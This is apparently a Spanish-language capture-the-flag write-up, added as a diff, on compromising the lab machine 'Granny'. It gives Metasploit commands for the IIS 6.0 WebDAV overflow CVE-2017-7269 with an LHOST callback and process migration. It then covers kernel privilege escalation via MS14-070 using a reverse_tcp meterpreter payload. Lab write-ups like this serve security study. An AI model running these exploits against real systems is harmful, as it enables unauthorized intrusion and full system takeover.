@@ -1,0 +1,70 @@
+Resumen Ejecutivo:
+
+El compromiso de la máquina "Granny" ilustra los riesgos asociados con el software End-of-Life (EoL). 
+El ataque se ejecutó en dos fases críticas: un RCE (Remote Code Execution) mediante el protocolo WebDAV en un servidor IIS 6.0, 
+seguido de una elevación de privilegios local (LPE),
+explotando una vulnerabilidad de corrupción de memoria en el driver de red del Kernel.
+
+Fase de Reconocimiento y Enumeración:
+
+Escaneo de Servicios
+Se realizó un escaneo inicial con Nmap para identificar la superficie de ataque:
+
+nmap -sC -sV 10.129.35.123
+
+Resultados clave:
+
+Servidor: Microsoft IIS 6.0.
+
+Vulnerabilidad Potencial: El servicio permite métodos WebDAV extendidos (PROPFIND, MOVE, COPY), lo que sugiere una exposición al desbordamiento de búfer en httpext.dll.
+
+Explotación Inicial (Acceso de Usuario)
+Vulnerabilidad: CVE-2017-7269
+
+El fallo reside en la función ScStoragePathFromUrl. Al enviar una cabecera HTTP If: diseñada maliciosamente con una ruta larga, 
+se provoca un desbordamiento en la pila, permitiendo el secuestro del flujo de ejecución.
+
+Ejecución del Exploit:
+
+use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+set RHOSTS 10.129.35.123
+set LHOST 10.10.14.204
+set ForceExploit true
+run
+
+Estabilización de la Shell (Migración de Proceso)
+Dado que el proceso w3wp.exe de IIS es inestable y se reinicia periódicamente, la sesión inicial es volátil. 
+Se procedió a realizar una migración a un proceso residente en memoria (notepad.exe) para asegurar la persistencia.
+
+meterpreter > run post/windows/manage/migrate
+
+
+Escalada de Privilegios (Privesc)
+Identificación del Vector
+Se utilizó el módulo local_exploit_suggester para analizar parches faltantes en el sistema operativo.
+
+
+Explotación del Kernel: MS14-070
+El sistema era vulnerable a una solicitud IOCTL malformada en el controlador tcpip.sys. 
+Este exploit permite inyectar código que se ejecuta con privilegios de nivel de Kernel.
+
+Configuración:
+
+Módulo: exploit/windows/local/ms14_070_tcpip_ioctl
+
+Payload: windows/meterpreter/reverse_tcp
+
+Resultado: Elevación exitosa a NT AUTHORITY\SYSTEM.
+
+Post-Explotación y Obtención de Flags
+En arquitecturas Windows antiguas (NT 5.2), las banderas se encuentran en la estructura de directorios "Documents and Settings".
+
+User Flag: C:\Documents and Settings\Lakis\Desktop\user.txt
+
+Root Flag: C:\Documents and Settings\Administrator\Desktop\root.txt
+
+
+
+
+
+
